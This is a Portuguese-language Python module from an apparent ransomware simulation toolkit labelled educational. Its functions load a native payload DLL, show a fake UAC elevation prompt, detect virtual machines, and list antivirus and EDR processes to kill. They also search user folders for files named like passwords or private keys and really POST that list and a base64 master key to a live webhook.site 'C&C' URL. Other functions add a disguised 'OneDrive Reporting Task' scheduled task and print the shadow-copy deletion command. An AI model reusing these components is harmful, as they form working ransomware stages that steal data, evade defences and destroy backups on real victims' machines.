"""
Módulo de Utilitários

Contém funções auxiliares para o projeto, como a criação do ambiente de teste.
"""
import os
import base64
import json
import ctypes
import tkinter as tk
from tkinter import messagebox

try:
    import requests
except ImportError:
    requests = None

try:
    import psutil
except ImportError:
    psutil = None

def execute_c_payload():
    """Carrega e executa uma função de uma DLL C compilada."""
    print("\n[!] SIMULAÇÃO: Tentando carregar e executar payload de baixo nível (C)...")
    payload_path = ".\\payload.dll"
    if os.name != 'nt':
        payload_path = "./payload.so" # Para Linux/macOS

    if not os.path.exists(payload_path):
        print(f"[-] Payload C não encontrado em '{payload_path}'.")
        print("[-] Compile o arquivo 'payload.c' primeiro.")
        print("[-] No Windows (com MinGW-w64): gcc -shared -o payload.dll payload.c")
        return

    try:
        # Carrega a biblioteca compartilhada
        c_lib = ctypes.CDLL(payload_path)
        
        # Define o protótipo da função (opcional, mas bom para checagem de tipo)
        c_lib.run_decoy_calculation.restype = None
        c_lib.run_decoy_calculation.argtypes = []

        # Executa a função C
        c_lib.run_decoy_calculation()
        print("[+] Payload C executado com sucesso.")

    except Exception as e:
        print(f"[-] Erro ao executar o payload C: {e}")

def get_all_user_profiles():
    """Enumera todos os perfis de usuário no sistema (Windows)."""
    print("\n[!] Enumerando perfis de usuário...")
    if os.name != 'nt':
        print("[-] A enumeração de perfis de usuário é aplicável apenas no Windows.")
        return []

    user_dirs = []
    users_path = os.path.join(os.environ['SystemDrive'], 'Users')
    excluded_profiles = ['Public', 'Default', 'All Users', 'Default User']

    try:
        for user in os.listdir(users_path):
            user_path = os.path.join(users_path, user)
            if os.path.isdir(user_path) and user not in excluded_profiles:
                print(f"[+] Perfil de usuário encontrado: {user_path}")
                user_dirs.append(user_path)
    except Exception as e:
        print(f"[-] Erro ao enumerar perfis de usuário: {e}")
    
    return user_dirs

def get_all_fixed_drives():
    """Enumera todos os drives fixos no sistema."""
    print("\n[!] Enumerando drives fixos...")
    if not psutil:
        print("[-] A biblioteca 'psutil' não está instalada. Pule a enumeração de drives.")
        return []

    drive_paths = []
    try:
        partitions = psutil.disk_partitions()
        for partition in partitions:
            if 'rw' in partition.opts and 'cdrom' not in partition.opts:
                print(f"[+] Drive encontrado: {partition.mountpoint}")
                drive_paths.append(partition.mountpoint)
    except Exception as e:
        print(f"[-] Erro ao enumerar drives: {e}")

    return drive_paths

def is_admin():
    """Verifica se o script está rodando com privilégios de administrador no Windows."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def simulate_uac_prompt():
    """Simula um prompt de UAC se o script não for administrador."""
    print("\n[!] SIMULAÇÃO: Verificando privilégios de administrador...")
    if os.name != 'nt':
        print("[-] Simulação de UAC aplicável apenas no Windows.")
        return False

    if is_admin():
        print("[+] O script já está sendo executado como Administrador.")
        return True
    
    print("[-] Privilégios de administrador não detectados.")
    print("[!] Exibindo uma simulação de prompt UAC para o usuário...")

    root = tk.Tk()
    root.withdraw()

    try:
        title = "🛡️ Controle de Conta de Usuário"
        message = (
            "Deseja permitir que este aplicativo faça alterações no seu dispositivo?\n\n" +
            "Nome do Programa: Ransomware Analysis Toolkit\n"
            "Fornecedor Verificado: Educational Purposes\n"
            "Origem do Arquivo: Disco rígido neste computador\n\n"
            "(Esta é uma simulação segura. Clicar em 'Sim' não concederá privilégios reais.)"
        )
        
        response = messagebox.askyesno(title, message, icon='warning')

        if response:
            print("[+] Elevação de privilégio CONCEDIDA pelo usuário (simulação). O ransomware continuaria com acesso total.")
            return True
        else:
            print("[-] Elevação de privilégio NEGADA pelo usuário (simulação). O ransomware continuaria com acesso limitado.")
            return False
    finally:
        root.destroy()

def detect_vm():
    """Simula a detecção de um ambiente de Máquina Virtual (VM)."""
    print("\n[!] SIMULAÇÃO: Verificando se está em um ambiente de VM...")
    if not psutil:
        print("[-] A biblioteca 'psutil' não está instalada. Pule a detecção de VM.")
        return False

    vm_processes = ["vboxservice.exe", "vmtoolsd.exe"]
    for proc in psutil.process_iter(['name']):
        if proc.info['name'].lower() in vm_processes:
            print(f"[+] VM detectada! Processo suspeito encontrado: {proc.info['name']}")
            print("[!] Um ransomware real poderia parar a execução ou alterar seu comportamento aqui.")
            return True
    
    print("[+] Nenhum processo de VM comum detectado.")
    return False

def simulate_kill_security_processes():
    """Simula a tentativa de finalizar processos de software de segurança."""
    print("\n[!] SIMULAÇÃO: Tentando finalizar processos de segurança (Antivírus, EDR)...") 
    if not is_admin():
        print("[-] Requer privilégios de administrador para finalizar processos. Simulação pulada.")
        return

    if not psutil:
        print("[-] A biblioteca 'psutil' não está instalada. Pule a detecção de processos.")
        return

    security_processes = [
        "msmpeng.exe", "msascuil.exe", "smartscreen.exe",
        "afwserv.exe", "avastui.exe",
        "avgui.exe", "avgidsagent.exe",
        "avguard.exe", "avira.exe",
        "bdagent.exe", "bdwtxag.exe",
        "avp.exe", "avpui.exe",
        "mcshield.exe", "mcuicnt.exe",
        "mbam.exe", "mbamservice.exe"
    ]

    found_procs = []
    for proc in psutil.process_iter(['name']):
        if proc.info['name'].lower() in security_processes:
            print(f"[!] Processo de segurança detectado: {proc.info['name']}. Simulando tentativa de finalização...")
            found_procs.append(proc.info['name'])

    if not found_procs:
        print("[+] Nenhum processo de segurança conhecido foi encontrado em execução.")
    else:
        print("[!] Em um ataque real, o ransomware tentaria finalizar esses processos para operar sem detecção.")

def simulate_data_exfiltration(target_dirs, session_id):
    """Simula a busca e exfiltração de arquivos sensíveis."""
    print("\n[!] SIMULAÇÃO: Procurando por arquivos sensíveis para exfiltração (roubo de dados)...")
    sensitive_keywords = ['senha', 'password', 'secret', 'privado', 'confidencial', 'backup', 'private_key']
    sensitive_files = []

    for target_dir in target_dirs:
        if not os.path.exists(target_dir):
            continue
        for root, _, files in os.walk(target_dir):
            for file in files:
                if any(keyword in file.lower() for keyword in sensitive_keywords):
                    filepath = os.path.join(root, file)
                    sensitive_files.append(filepath)
                    print(f"[+] Arquivo sensível encontrado: {filepath}")

    if not sensitive_files:
        print("[+] Nenhum arquivo sensível encontrado para exfiltrar.")
        return

    print(f"[!] {len(sensitive_files)} arquivos sensíveis encontrados. Simulando exfiltração para o servidor C&C...")
    
    if not requests:
        print("[-] A biblioteca 'requests' não está instalada. Não é possível simular a exfiltração.")
        return

    c2_url = "https://webhook.site/a2c8b9e5-a753-4243-9b63-5d853318a735" # Mesma URL de exemplo

    payload = {
        'session_id': session_id,
        'status': 'data_exfiltrated',
        'exfiltrated_files': sensitive_files
    }

    try:
        response = requests.post(c2_url, json=payload, timeout=15)
        if response.status_code == 200:
            print("[+] Lista de arquivos sensíveis exfiltrada com sucesso para o C&C (simulação). Status: OK")
        else:
            print(f"[-] O servidor C&C respondeu com um erro durante a exfiltração. Status: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Falha na comunicação com o servidor C&C durante a exfiltração: {e}")

def create_test_environment():
    """Cria um ambiente de teste seguro com arquivos e diretórios de exemplo."""
    print("[+] Criando ambiente de teste...")
    test_dir = "./test_files"
    os.makedirs(test_dir, exist_ok=True)
    
    subdirs = ['documents', 'images', 'data', 'code']
    for subdir in subdirs:
        os.makedirs(os.path.join(test_dir, subdir), exist_ok=True)
    
    test_files = {
        'documents/relatorio_confidencial.txt': 'Relatório importante' * 100,
        'documents/minhas_senhas.txt': 'senha123\nsecret_key\n',
        'images/foto.jpg': b'\xff\xd8\xff\xe0' * 1000,
        'data/clientes.csv': 'nome,email,telefone\n' + 'Cliente,email@test.com,123456\n' * 50,
        'data/backup_2025.zip': b'PK' * 100,
        'code/script.py': 'print("Hello World")' * 50,
    }
    
    for filepath, content in test_files.items():
        full_path = os.path.join(test_dir, filepath)
        mode = 'wb' if isinstance(content, bytes) else 'w'
        with open(full_path, mode) as f:
            f.write(content)
    
    print(f"[+] Ambiente de teste criado com sucesso em: {test_dir}")
    print(f"[+] {len(test_files)} arquivos de exemplo em {len(subdirs)} diretórios.")

def simulate_persistence():
    """Simula a criação de persistência via Tarefa Agendada no Windows."""
    print("\n[!] SIMULAÇÃO: Adicionando persistência via Tarefa Agendada...")
    if os.name == 'nt':
        try:
            task_name = "OneDrive Reporting Task"
            command = "calc.exe"
            if is_admin():
                print("[+] Executando com privilégios de administrador.")
                full_command = f'schtasks /create /tn "{task_name}" /tr "{command}" /sc onlogon /rl highest /f'
            else:
                print("[-] Executando com privilégios limitados.")
                full_command = f'schtasks /create /tn "{task_name}" /tr "{command}" /sc onlogon /f'

            print(f"[+] Comando de persistência: {full_command}")
            os.system(full_command)
            print("[+] Simulação de persistência concluída com sucesso.")
        except Exception as e:
            print(f"[-] Falha ao simular a persistência: {e}")
    else:
        print("[-] Simulação de persistência via Tarefa Agendada é aplicável apenas no Windows.")

def simulate_shadow_copy_deletion():
    """Simula a tentativa de exclusão de Cópias de Sombra no Windows."""
    print("\n[!] SIMULAÇÃO: Tentando deletar Cópias de Sombra (Volume Shadow Copies)...")
    if not is_admin():
        print("[-] Requer privilégios de administrador para listar ou deletar cópias de sombra. Simulação pulada.")
        return

    if os.name == 'nt':
        try:
            print("[+] Listando cópias de sombra existentes (simulação)...")
            os.system("vssadmin list shadows")
            print("\n[!] Em um ataque real, o seguinte comando seria usado para deletar as cópias:")
            print("    vssadmin.exe delete shadows /all /quiet")
            print("[+] Nenhuma cópia de sombra foi realmente deletada.")
        except Exception as e:
            print(f"[-] Falha ao simular a exclusão de cópias de sombra: {e}")
    else:
        print("[-] Simulação de exclusão de Cópias de Sombra é aplicável apenas no Windows.")

def cleanup_persistence():
    """Remove a tarefa agendada criada para a simulação de persistência."""
    print("\n[!] Removendo simulação de persistência...")
    if os.name == 'nt':
        try:
            task_name = "OneDrive Reporting Task"
            full_command = f'schtasks /delete /tn "{task_name}" /f'
            print(f"[+] Comando de limpeza: {full_command}")
            os.system(full_command)
            print("[+] Simulação de persistência removida com sucesso.")
        except Exception as e:
            print(f"[-] Falha ao remover a tarefa agendada: {e}")

def simulate_c2_communication(session_id, master_key):
    """Simula o envio da chave de sessão para um servidor de Comando e Controle (C&C)."""
    print("\n[!] SIMULAÇÃO: Comunicando com o servidor C&C para exfiltrar a chave...")
    if not requests:
        print("[-] A biblioteca 'requests' não está instalada. Pule a simulação de C&C.")
        print("[-] Para habilitar, instale com: pip install requests")
        return

    c2_url = "https://webhook.site/a2c8b9e5-a753-4243-9b63-5d853318a735" # URL de exemplo, substitua pelo seu

    payload = {
        'session_id': session_id,
        'master_key_b64': base64.b64encode(master_key).decode('utf-8'),
        'status': 'key_exfiltrated'
    }

    try:
        print(f"[+] Enviando dados para o endpoint C&C: {c2_url}")
        response = requests.post(c2_url, json=payload, timeout=10)
        if response.status_code == 200:
            print("[+] Chave exfiltrada com sucesso para o servidor C&C (simulação). Status: OK")
        else:
            print(f"[-] O servidor C&C respondeu com um erro. Status: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Falha na comunicação com o servidor C&C: {e}")
